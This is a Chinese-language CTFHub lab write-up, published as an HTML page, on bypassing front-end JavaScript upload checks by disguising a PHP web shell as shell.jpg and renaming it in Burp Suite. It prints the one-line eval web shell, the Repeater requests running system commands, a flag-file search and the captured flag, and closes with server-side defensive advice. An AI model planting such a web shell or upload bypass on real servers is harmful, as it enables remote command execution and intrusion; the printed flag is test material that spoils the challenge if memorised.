@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-前端验证 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href=" ">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-前端验证 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.19 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, 文件上传, 前端验证, BurpSuite</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - 文件上传 / 前端验证</li>
+        <li><strong>题目名称：</strong>前端验证</li>
+        <li><strong>提示：</strong>利用前端 JavaScript 的局限性，使用 Burp Suite 修改数据包绕过校验</li>
+    </ul>
+
+    <h2>2. 解题思路</h2>
+    <p>本题的核心是利用“前端验证”的脆弱性。前端 JavaScript 代码在用户的浏览器中运行，攻击者对其具有绝对的控制权。通过在本地将木马文件伪装为 <code>shell.jpg</code>，可轻易绕过浏览器端的 JS 后缀检测。随后使用 Burp Suite 拦截请求，将文件后缀名改回 <code>shell.php</code>，从而在服务器端保存并执行恶意代码。</p >
+
+    <h2>3. 操作步骤</h2>
+    
+    <p><strong>第一步：本地文件制作与伪装</strong></p >
+    <p>由于之前的木马文件已清理，本次在 VS Code 中新建文件，内容为：</p >
+    <pre><code>GIF89a
+&lt;?php @eval($_POST['cmd']); ?&gt;</code></pre>
+    <ul>
+        <li>保存到 <code>muma</code> 文件夹。</li>
+        <li><strong>关键点：</strong>文件名直接命名为 <code>shell.jpg</code>。这是因为网页前端的 JS 脚本会检查后缀，我们必须用 <code>.jpg</code> 才能让请求发出去。</li>
+    </ul>
+
+    <p><strong>第二步：前端绕过与 BP 抓包</strong></p >
+    <ol>
+        <li>开启“前端验证”靶场环境，确保 Burp 处于拦截开启状态（<code>Intercept is on</code>）。</li>
+        <li>在 BP 自带浏览器中选中 <code>shell.jpg</code> 并提交，前端未报错（JS 校验通过）。</li>
+        <li>BP 成功拦截 POST 请求，在请求体中找到：<br><code>Content-Disposition: form-data; name="file"; filename="shell.jpg"</code></li>
+        <li><strong>偷梁换柱：</strong>手动将 <code>filename="shell.jpg"</code> 修改为 <code>filename="shell.php"</code>，然后点击 <code>Forward</code> 放行。</li>
+        <li>网页提示“上传成功”，文件保存路径为 <code>upload/shell.php</code>。</li>
+    </ol>
+
+    <p><strong>第三步：Repeater 连马与语法踩坑</strong></p >
+    <p>将请求发送至 <code>Repeater</code> 标签页，进行标准的连马操作：</p >
+    <ol>
+        <li>修改第一行为：<code>POST /upload/shell.php HTTP/1.1</code></li>
+        <li>将 <code>Content-Type</code> 改为 <code>application/x-www-form-urlencoded</code>，彻底清空下方所有 <code>------WebKitFormBoundary...</code> 内容。</li>
+        <li>输入命令：<code>cmd=system("ls /");</code></li>
+        <li>修改第3行 <code>Content-Length: 19</code>，确保保留空行，点击 <code>Send</code>。</li>
+        <li><strong>手滑踩坑：</strong>首次发送时，不小心将命令误写为 <code>cmd=system("ls /0;</code>。服务器返回 <code>Parse error: syntax error, unexpected '0'</code>。这实际上证明了木马已经成功执行（PHP 引擎正在解析我们的代码）。</li>
+        <li>修正命令后，成功回显根目录列表。</li>
+    </ol>
+
+    <p><strong>第四步：搜索并读取 Flag（防坑策略）</strong></p >
+    <ol>
+        <li>利用 <code>find</code> 命令全盘搜索：<code>cmd=system("find / -name flag* 2>/dev/null");</code>（长度45）。</li>
+        <li>成功获取路径：<code>/var/www/html/flag_3216014105.php</code>。</li>
+        <li><strong>基于前关经验的防坑：</strong>判断沙盒环境可能禁用底层 <code>cat</code> 命令，直接使用 PHP 原生函数读取：<br><code>cmd=print_r(file_get_contents('/var/www/html/flag_3216014105.php'));</code>（长度68）。</li>
+        <li>右侧成功回显 Flag：<code>ctfhub{e354135699134bb823d6157a}</code></li>
+    </ol>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>前端 JS 验证的局限性：</strong>前端代码运行在本地，攻击者拥有绝对控制权。不仅可以通过抓包改后缀绕过，甚至可以直接在 F12 开发者工具中修改 JS 逻辑。这证明了安全校验必须依赖于服务端。</li>
+        <li><strong>HTTP 协议的细节与手滑陷阱：</strong>在手动拼接 <code>Content-Length</code> 时，必须极其精确，少一个空格或多一个换行都会导致服务器报错。<code>Parse error</code> 报错信息中的“eval()'d code”反而给渗透测试者提供了代码被执行的有效反馈。</li>
+        <li><strong>沙盒环境下的策略选择：</strong>在受限的 Web 沙盒环境中，PHP 原生的文件读取函数（如 <code>print_r(file_get_contents(...))</code>）比底层系统命令（如 <code>cat</code>）具有更高的可用性和稳定性。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>前端验证绕过：</strong>通过修改本地文件后缀（如 <code>shell.php</code> 改为 <code>shell.jpg</code>）欺骗前端 JS。当请求进入 Burp 时，再修改 <code>filename</code> 为 <code>.php</code> 欺骗后端。</li>
+        <li><strong>攻击链组合：</strong>本题融合了文件后缀伪装、MIME 类型修改、Repeater 连马、精确计算 Content-Length 等多个知识点，是对前三关技能的完美综合运用。</li>
+        <li><strong>安全防御建议：</strong>切勿依赖前端进行安全校验。服务端必须严格执行后缀白名单、MIME 校验，并设置上传目录不可执行（如配置 Nginx/Apache 禁止运行上传目录下的脚本），这是防御文件上传漏洞最根本的方案。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
